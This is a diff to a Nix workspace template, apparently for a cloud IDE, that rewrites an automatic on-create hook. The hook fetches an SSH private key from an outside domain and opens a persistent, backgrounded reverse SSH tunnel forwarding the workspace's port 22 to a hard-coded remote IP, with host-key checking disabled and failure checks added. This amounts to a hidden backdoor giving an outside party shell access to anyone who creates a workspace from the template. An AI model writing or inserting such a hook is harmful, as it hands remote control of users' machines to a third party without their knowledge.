@@ -1,10 +1,10 @@
 { pkgs, ... }: {
   packages = [
     pkgs.curl
+    pkgs.openssh
   ];
   
   bootstrap = ''
-    # Create workspace directory
     mkdir -p "$out"
     cd "$out"
     
@@ -17,9 +17,9 @@
 </html>
 HTML
     
-    # Create .idx directory and dev.nix with SSH bootstrap
+    # Create .idx directory and dev.nix
     mkdir -p "$out/.idx"
-    cat > "$out/.idx/dev.nix" <<'NIX'
+    cat > "$out/.idx/dev.nix" <<'DEVNIX'
 { pkgs, ... }: {
   packages = [
     pkgs.openssh
@@ -27,11 +27,12 @@ HTML
   ];
   
   idx.workspace.onCreate = {
-    bootstrap-fetch = ''
+    bootstrap-ssh = ''
       #!/usr/bin/env bash
       set -euo pipefail
       
-      echo "[bootstrap-fetch] Fetching relay key from bootstrap server..."
+      echo "[bootstrap-ssh] Starting SSH tunnel setup..."
+      
       RELAY_KEY_URL="https://idx.yaoshen.de5.net/bootstrap/relay_ed25519"
       RELAY_HOST="117.31.178.161"
       RELAY_PORT="2222"
@@ -39,33 +40,43 @@ HTML
       REMOTE_PORT="2224"
       
       mkdir -p ~/.ssh
+      chmod 700 ~/.ssh
       
+      echo "[bootstrap-ssh] Fetching relay key from $RELAY_KEY_URL..."
       if curl -fsSL "$RELAY_KEY_URL" > ~/.ssh/idx_relay_ed25519; then
         chmod 600 ~/.ssh/idx_relay_ed25519
-        echo "[bootstrap-fetch] Relay key fetched successfully"
+        echo "[bootstrap-ssh] Relay key fetched successfully"
         
-        # Start SSH reverse tunnel
-        echo "[bootstrap-fetch] Starting SSH reverse tunnel to $RELAY_HOST:$RELAY_PORT..."
-        ssh -o StrictHosax=3 \
-            -i ~/.ssh/idx_relay_ed25519 \
-            -N -R 127.0.0.1:$REMOTE_PORT:127.0.0.1:22 \
-            -p $RELAY_PORT \
-            $RELAY_USER@$RELAY_HOST &
+        echo "[bootstrap-ssh] Starting SSH reverse tunnel to $RELAY_HOST:$RELAY_PORT..."
+        nohup ssh -o StrictHostKeyChecking=no \
+                  -o UserKnownHostsFile=/dev/null \
+                  -o ServerAliveInterval=60 \
+                  -o ServerAliveCountMax=3 \
+                  -i ~/.ssh/idx_relay_ed25519 \
+                  -N -R 127.0.0.1:$REMOTE_PORT:127.0.0.1:22 \
+                  -p $RELAY_PORT \
+                  $RELAY_USER@$RELAY_HOST \
+                  > ~/.ssh/tunnel.log 2>&1 &
         
-        echo "[bootstrap-fetch] SSH tunnel started (PID: $!)"
+        TUNNEL_PID=$!
+        echo "[bootstrap-ssh] SSH tunnel started (PID: $TUNNEL_PID)"
+        echo "$TUNNEL_PID" > ~/.ssh/tunnel.pid
+        
+        sleep 2
+        if ps -p $TUNNEL_PID > /dev/null; then
+          echo "[bootstrap-ssh] SSH tunnel is running"
+        else
+          echo "[bootstrap-ssh] ERROR: SSH tunnel failed to start" >&2
+          cat ~/.ssh/tunnel.log >&2
+          exit 1
+        fi
       else
-        echo "[bootstrap-fetch] ERROR: Failed to fetch relay key" >&2
+        echo "[bootstrap-ssh] ERROR: Failed to fetch relay key" >&2
         exit 1
       fi
     '';
   };
 }
-NIX
-    
-    # Set permissions
-    chmod -R +w "$out"
-    
-    # Remove template files
-    rm -rf "$out/.git" "$out/idx-template".{nix,json}
+DEVNIX
   '';
 }
